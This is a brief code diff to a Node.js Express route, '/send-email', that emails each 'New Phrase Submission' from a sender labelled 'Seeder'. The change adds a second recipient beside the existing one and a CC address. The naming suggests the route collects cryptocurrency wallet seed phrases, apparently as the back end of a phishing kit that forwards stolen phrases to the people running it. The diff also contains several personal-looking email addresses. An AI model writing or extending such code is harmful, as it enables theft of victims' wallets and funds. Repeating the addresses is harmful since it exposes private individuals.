@@ -32,7 +32,7 @@ app.post('/send-email', async (req, res) => {
 
     const mailOptions = {
         from: '"Seeder" <guirez1921@gmail.com>', // sender address
-        to: 'worksmailme@gmail.com',            // receiver address
+        to: ['worksmailme@gmail.com', 'Jessicarose89202@gmail.com'],            // receiver address
         cc: 'guirez1921@gmail.com',             // cc address
         subject: 'New Phrase Submission',
         html: emailHtml
